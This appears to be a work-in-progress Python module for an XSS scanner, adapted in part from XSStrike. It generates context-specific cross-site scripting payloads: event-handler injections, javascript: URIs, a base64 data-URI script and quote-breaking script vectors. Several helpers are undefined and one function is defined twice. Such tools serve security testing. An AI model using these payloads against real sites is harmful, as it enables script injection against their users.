import re
from enum import Enum

import attr
from bs4 import BeautifulSoup, Tag


def generator(occurences, response):
    print(occurences)
    scripts = extractScripts(response)
    index = 0
    vectors = {11: set(), 10: set(), 9: set(), 8: set(), 7: set(),
               6: set(), 5: set(), 4: set(), 3: set(), 2: set(), 1: set()}
    for i in occurences:
        context = occurences[i]['context']
        if context == 'html':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            badTag = occurences[i]['details']['badTag'] if 'badTag' in occurences[i]['details'] else ''
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends, badTag)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'attribute':
            found = False
            tag = occurences[i]['details']['tag']
            Type = occurences[i]['details']['type']
            quote = occurences[i]['details']['quote'] or ''
            attributeName = occurences[i]['details']['name']
            attributeValue = occurences[i]['details']['value']
            quoteEfficiency = occurences[i]['score'][quote] if quote in occurences[i]['score'] else 100
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if greatBracketEfficiency == 100 and quoteEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    payload = quote + '>' + payload
                    found = True
                    vectors[9].add(payload)
            if quoteEfficiency == 100:
                for filling in fillings:
                    for function in functions:
                        vector = quote + filling + r('autofocus') + \
                                 filling + r('onfocus') + '=' + quote + function
                        found = True
                        vectors[8].add(vector)
            if quoteEfficiency == 90:
                for filling in fillings:
                    for function in functions:
                        vector = '\\' + quote + filling + r('autofocus') + filling + \
                                 r('onfocus') + '=' + function + filling + '\\' + quote
                        found = True
                        vectors[7].add(vector)
            if Type == 'value':
                if attributeName == 'srcdoc':
                    if occurences[i]['score']['&lt;']:
                        if occurences[i]['score']['&gt;']:
                            del ends[:]
                            ends.append('%26gt;')
                        payloads = genGen(
                            fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                        for payload in payloads:
                            found = True
                            vectors[9].add(payload.replace('<', '%26lt;'))
                elif attributeName == 'href' and attributeValue == xsschecker:
                    for function in functions:
                        found = True
                        vectors[10].add(r('javascript:') + function)
                elif attributeName.startswith('on'):
                    closer = jsContexter(attributeValue)
                    quote = ''
                    for char in attributeValue.split(xsschecker)[1]:
                        if char in ['\'', '"', '`']:
                            quote = char
                            break
                    suffix = '//\\'
                    for filling in jFillings:
                        for function in functions:
                            vector = quote + closer + filling + function + suffix
                            if found:
                                vectors[7].add(vector)
                            else:
                                vectors[9].add(vector)
                    if quoteEfficiency > 83:
                        suffix = '//'
                        for filling in jFillings:
                            for function in functions:
                                if '=' in function:
                                    function = '(' + function + ')'
                                if quote == '':
                                    filling = ''
                                vector = '\\' + quote + closer + filling + function + suffix
                                if found:
                                    vectors[7].add(vector)
                                else:
                                    vectors[9].add(vector)
                elif tag in ('script', 'iframe', 'embed', 'object'):
                    if attributeName in ('src', 'iframe', 'embed') and attributeValue == xsschecker:
                        payloads = ['//15.rs', '\\/\\\\\\/\\15.rs']
                        for payload in payloads:
                            vectors[10].add(payload)
                    elif tag == 'object' and attributeName == 'data' and attributeValue == xsschecker:
                        for function in functions:
                            found = True
                            vectors[10].add(r('javascript:') + function)
                    elif quoteEfficiency == greatBracketEfficiency == 100:
                        payloads = genGen(fillings, eFillings, lFillings,
                                          eventHandlers, tags, functions, ends)
                        for payload in payloads:
                            payload = quote + '>' + r('</script/>') + payload
                            found = True
                            vectors[11].add(payload)
        elif context == 'comment':
            lessBracketEfficiency = occurences[i]['score']['<']
            greatBracketEfficiency = occurences[i]['score']['>']
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if lessBracketEfficiency == 100:
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    vectors[10].add(payload)
        elif context == 'script':
            if scripts:
                try:
                    script = scripts[index]
                except IndexError:
                    script = scripts[0]
            else:
                continue
            closer = jsContexter(script)
            quote = occurences[i]['details']['quote']
            scriptEfficiency = occurences[i]['score']['</scRipT/>']
            greatBracketEfficiency = occurences[i]['score']['>']
            breakerEfficiency = 100
            if quote:
                breakerEfficiency = occurences[i]['score'][quote]
            ends = ['//']
            if greatBracketEfficiency == 100:
                ends.append('>')
            if scriptEfficiency == 100:
                breaker = r('</script/>')
                payloads = genGen(fillings, eFillings, lFillings,
                                  eventHandlers, tags, functions, ends)
                for payload in payloads:
                    vectors[10].add(payload)
            if closer:
                suffix = '//\\'
                for filling in jFillings:
                    for function in functions:
                        vector = quote + closer + filling + function + suffix
                        vectors[7].add(vector)
            elif breakerEfficiency > 83:
                prefix = ''
                suffix = '//'
                if breakerEfficiency != 100:
                    prefix = '\\'
                for filling in jFillings:
                    for function in functions:
                        if '=' in function:
                            function = '(' + function + ')'
                        if quote == '':
                            filling = ''
                        vector = prefix + quote + closer + filling + function + suffix
                        vectors[6].add(vector)
            index += 1
    return vectors


class ContextType(Enum):
    HTML = 1
    HTML_WITHOUT_ENCLOSE = 2
    ATTRIBUTE = 3
    COMMENT = 4
    JAVASCRIPT = 5
    CSS = 6


class Context:
    type: ContextType
    endTag: str


#  [*] Scan occurences: {2834: {'position': 2834, 'context': 'html', 'details': {}}}


def strMapToEle(context: str) -> ContextType:
    if context == 'html':
        return ContextType.HTML
    elif context == 'attribute':
        return ContextType.ATTRIBUTE
    elif context == 'comment':
        return ContextType.COMMENT
    elif context == 'script':
        return ContextType.JAVASCRIPT
    pass


def generator(occ: dict, response: str):
    for i in occ:
        element = occ[i]
        context: str = element['context']
        pos: int = element['position']
        generate(strMapToEle(context), pos, response)
    pass


# rawTag
rawTag = 'script'

# error
errorTag = ["img", 'video', 'audio', 'embed']

# load
loadTag = ["iframe", 'svg', 'body']

# focus
focusTag = ["iframe", "a", "select", "input", 'textarea']

# javascript fake protocol
linkTag = ["a", "iframe", "img", "form"]

# base64
base64Tag = ['embed', 'object', 'iframe']

tag = ['a', 'img', 'html', 'script']

malicious = ["alert(/1/)"]


def htmlType() -> list[str]:
    vector = []
    # raw
    for m in malicious:
        rawPayload: Tag = Tag(name=rawTag)
        rawPayload.string = m
        vector.append(str(rawPayload))
    # error
    for m in malicious:
        for error in errorTag:
            errorPayload: Tag = Tag(name=error)
            errorPayload.attrs = {
                "src": "",
                "onerror": m
            }
            vector.append(str(errorPayload))
    # onload
    for m in malicious:
        for load in loadTag:
            loadPayload: Tag = Tag(name=load)
            loadPayload.attrs = {
                "onload": m
            }
            vector.append(str(loadPayload))
    # onfocus
    for m in malicious:
        for focus in focusTag:
            focusPayload: Tag = Tag(name=focus)
            focusPayload.attrs = {
                'onfocus': m,
                'autofocus': None
            }
            vector.append(str(focusPayload))
    # javascript fake
    for m in malicious:
        for fake in linkTag:
            fakePayload: Tag = Tag(name=fake)
            payload = "javascript:" + m
            if fake in ['iframe', 'img']:
                fakePayload.attrs = {
                    'src': payload
                }
            elif fake == 'a':
                fakePayload.attrs = {
                    "href": payload
                }
            elif fake == 'form':
                fakePayload.attrs = {
                    "action": payload
                }
            else:
                raise Exception("error")

            vector.append(str(fakePayload))
    # base64
    for t in base64Tag:
        base64Payload = Tag(name=t)
        payload = "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
        if t == 'object':
            base64Payload.attrs = {
                "data": payload
            }
        elif t in ['embed', 'iframe']:
            base64Payload.attrs = {
                "src": payload
            }
        else:
            raise Exception("error")
        vector.append(str(base64Payload))

    return vector


def generate(ctx: ContextType, pos: int, response: str):
    vector: list[str] = []
    if ctx == ContextType.HTML:
        vector.extend(htmlType())
    elif ctx == ContextType.ATTRIBUTE:

        pass
    elif ctx == ContextType.COMMENT:
        pass
    elif ctx == ContextType.JAVASCRIPT:
        pass
    elif ctx == ContextType.CSS:
        pass

    for v in vector:
        print(v)

def find_my_case(tag: Tag):
    for (_, value) in tag.attrs.items():
        if re.compile(xsschecker).match(value):
            return True
    return False



def getLocationInfo(ctx: ContextType, pos: int, res: str, checker: str):
    bs: BeautifulSoup = BeautifulSoup(res, "html.parser")
    # attrs
    # elements = bs.find_all(string=re.compile("v3dm0s"))
    # for element in elements:
    #     print(element)
    # elements = bs.find_all(attrs={re.compile(".+"): re.compile("v3dm0s")})
    # for element in elements:
    #     print(element)
    elements = bs.find_all(find_my_case)
    for element in elements:
        print(element)
    pass


# just for test
if __name__ == '__main__':

    from __init__ import occ, response, xsschecker, test2Str

    def testGene():
        generator(occ, response)

    def testLoc():
        for i in occ:
            element = occ[i]
            context: str = element['context']
            pos: int = element['position']
            getLocationInfo(strMapToEle(context), pos,test2Str , xsschecker)

    testLoc()

    # testGene()



